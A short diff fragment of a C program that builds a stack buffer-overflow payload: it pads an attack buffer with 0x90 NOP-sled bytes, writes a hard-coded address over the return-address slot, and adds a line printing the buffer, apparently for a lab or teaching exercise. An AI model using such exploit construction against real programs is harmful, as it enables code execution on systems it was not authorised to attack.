@@ -23,6 +23,8 @@ main ( int argc, char * argv[] )
 	for (int i = SHELL_SIZE; i < BUF_SIZE; i++)
 		attack_buffer[i] = 0x90;
 
+	printf("%s", attack_buffer);
+
 
 	int *ret_address = (int*)&attack_buffer[BUF_TO_RET];
 	*ret_address = BUF_ADDR;
